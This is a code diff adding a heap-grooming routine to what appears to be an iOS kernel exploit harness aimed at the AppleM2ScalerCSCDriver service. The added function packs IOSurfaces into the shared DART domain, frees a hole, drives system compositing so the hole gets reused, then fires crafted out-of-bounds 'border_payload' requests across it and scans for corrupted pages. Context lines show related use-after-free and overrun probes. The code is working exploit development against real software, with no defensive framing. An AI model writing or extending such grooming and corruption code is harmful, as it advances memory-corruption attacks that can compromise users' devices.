@@ -16520,6 +16520,126 @@ static void p_xproof(void) {
     LOG("[xp] done (alive)");
 }
 
+// V104: groom the shared DART domain. Dense-pack N surfaces (4096x64 = 1MB,
+// max W=0x1000 passes validation), hole in the middle (CFRelease), system
+// scaler activity to get the hole reused by someone else, then Y-wrap
+// traversal shots across the hole. fsync before every shot; max 3 panics.
+static void p_groom(void) {
+    LOG("[groom] v104: DART groom");
+    io_connect_t c = open_service("AppleM2ScalerCSCDriver", 0);
+    if (!c) return;
+    uint8_t *req = must_map(0x1000);
+    IOSurfaceRef src = make_surface(64, 64);
+    enum { GN = 32 };
+    static IOSurfaceRef sf[GN];   // static: survives nothing, but keeps stack small
+    IOSurfaceID si = IOSurfaceGetID(src);
+    for (int i = 0; i < GN; i++) sf[i] = make_surface(4096, 64);
+    // legit-wire all (map into the domain)
+    for (int i = 0; i < GN; i++) {
+        craft_transform(req, si, IOSurfaceGetID(sf[i]), 64, 64);
+        scaler_call1(c, req);
+        usleep(30000);
+    }
+    usleep(1000000);
+    // markers: byte = idx+1
+    for (int i = 0; i < GN; i++) {
+        if (IOSurfaceLock(sf[i], 0, NULL)) continue;
+        memset(IOSurfaceGetBaseAddress(sf[i]), i + 1, IOSurfaceGetAllocSize(sf[i]));
+        IOSurfaceUnlock(sf[i], 0, NULL);
+    }
+    LOG("[groom] packed+wired %d surfaces of 1MB", GN);
+
+    // Step 1: density check — shot dst = LAST surface, W=0x1000 (span ~1.04MB:
+    // covers the previous surface if dense; no panic expected if packed)
+    LOG("[groom] S1 density shot dst=s%d W 0x1000 (PANIC possible)", GN - 1);
+    fsync(fileno(stderr));
+    border_payload(req, si, IOSurfaceGetID(sf[GN - 1]),
+                   (uint32_t)(0x100000010ULL - 0x1000), 0xFFFFFFF0, 0x1000, 0x20, 32, 32);
+    kern_return_t kr = scaler_call1(c, req);
+    LOG("[groom] S1 -> kr 0x%08x (survived => dense or fault-tolerated)", kr);
+    usleep(200000);
+    for (int i = GN - 3; i < GN; i++) {
+        if (IOSurfaceLock(sf[i], kIOSurfaceLockReadOnly, NULL)) continue;
+        uint8_t *b = (uint8_t *)IOSurfaceGetBaseAddress(sf[i]);
+        long bad = 0;
+        size_t total = (size_t)IOSurfaceGetAllocSize(sf[i]);
+        for (size_t p = 0; p < total; p += 0x1000)
+            if (b[p] != (uint8_t)(i + 1)) bad++;
+        LOG("[groom] S1 scan s%d: %ld bad pages", i, bad);
+        IOSurfaceUnlock(sf[i], kIOSurfaceLockReadOnly, NULL);
+    }
+
+    // Step 2: hole — release s14..s17
+    for (int i = 14; i <= 17; i++) { CFRelease(sf[i]); sf[i] = NULL; }
+    LOG("[groom] S2: hole released s14..s17");
+    usleep(500000);
+    // shot across the hole: dst = s18, span covers s17..s14 region
+    LOG("[groom] S2 hole shot dst=s18 W 0x1000 (PANIC if hole unmapped)");
+    fsync(fileno(stderr));
+    border_payload(req, si, IOSurfaceGetID(sf[18]),
+                   (uint32_t)(0x100000010ULL - 0x1000), 0xFFFFFFF0, 0x1000, 0x20, 32, 32);
+    kr = scaler_call1(c, req);
+    LOG("[groom] S2 -> kr 0x%08x (survived => hole still mapped (lazy) or reused)", kr);
+    usleep(200000);
+
+    // Step 3: system scaler activity, then re-shot across the hole
+    dispatch_async(dispatch_get_main_queue(), ^{
+        @autoreleasepool {
+            UIWindow *win = nil;
+            for (UIScene *sc in [UIApplication sharedApplication].connectedScenes)
+                if ([sc isKindOfClass:[UIWindowScene class]])
+                    for (UIWindow *w in ((UIWindowScene *)sc).windows) if (w.isKeyWindow) win = w;
+            if (win) {
+                UIView *v = [[UIView alloc] initWithFrame:CGRectMake(20, 60, 900, 500)];
+                v.backgroundColor = [UIColor colorWithRed:0 green:1 blue:1 alpha:0.6];
+                [win addSubview:v];
+                [UIView animateWithDuration:0.25 delay:0
+                                    options:UIViewAnimationOptionAutoreverse | UIViewAnimationOptionRepeat | UIViewAnimationOptionAllowUserInteraction
+                                 animations:^{ v.transform = CGAffineTransformMakeScale(0.4, 1.7); }
+                                 completion:nil];
+            }
+        }
+    });
+    for (int round = 0; round < 4; round++) {
+        // extra compositing pressure: snapshot the window
+        dispatch_sync(dispatch_get_main_queue(), ^{
+            @autoreleasepool {
+                for (UIScene *sc in [UIApplication sharedApplication].connectedScenes) {
+                    if (![sc isKindOfClass:[UIWindowScene class]]) continue;
+                    for (UIWindow *w in ((UIWindowScene *)sc).windows) {
+                        if (!w.isKeyWindow) continue;
+                        UIGraphicsImageRenderer *r = [[UIGraphicsImageRenderer alloc] initWithSize:w.bounds.size];
+                        [r imageWithActions:^(UIGraphicsImageRendererContext *ctx) {
+                            [w drawViewHierarchyInRect:w.bounds afterScreenUpdates:YES];
+                        }];
+                    }
+                }
+            }
+        });
+        usleep(500000);
+        LOG("[groom] S3 round %d: activity done, hole shot (PANIC possible)", round);
+        fsync(fileno(stderr));
+        border_payload(req, si, IOSurfaceGetID(sf[18]),
+                       (uint32_t)(0x100000010ULL - 0x1000), 0xFFFFFFF0, 0x1000, 0x20, 32, 32);
+        kr = scaler_call1(c, req);
+        LOG("[groom] S3 round %d t=%ld -> kr 0x%08x", round, (long)time(NULL), kr);
+        usleep(200000);
+    }
+    // final scan around the hole: s12..s20
+    for (int i = 12; i <= 20; i++) {
+        if (!sf[i]) { LOG("[groom] final scan s%d: (hole)", i); continue; }
+        if (IOSurfaceLock(sf[i], kIOSurfaceLockReadOnly, NULL)) continue;
+        uint8_t *b = (uint8_t *)IOSurfaceGetBaseAddress(sf[i]);
+        long bad = 0;
+        size_t total = (size_t)IOSurfaceGetAllocSize(sf[i]);
+        for (size_t p = 0; p < total; p += 0x1000)
+            if (b[p] != (uint8_t)(i + 1)) bad++;
+        LOG("[groom] final scan s%d: %ld bad pages", i, bad);
+        IOSurfaceUnlock(sf[i], kIOSurfaceLockReadOnly, NULL);
+    }
+    LOG("[groom] done (alive)");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -16650,6 +16770,7 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        if (getenv("FUZZ_GROOM")) { p_groom(); LOG("[probe13] groom-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPROOF")) { p_xproof(); LOG("[probe13] xproof-only mode, stop"); return NULL; }
         if (getenv("FUZZ_OVERRUN")) { p_overrun(); LOG("[probe13] overrun-only mode, stop"); return NULL; }
         if (getenv("FUZZ_VALHUNT")) { p_valhunt(); LOG("[probe13] valhunt-only mode, stop"); return NULL; }
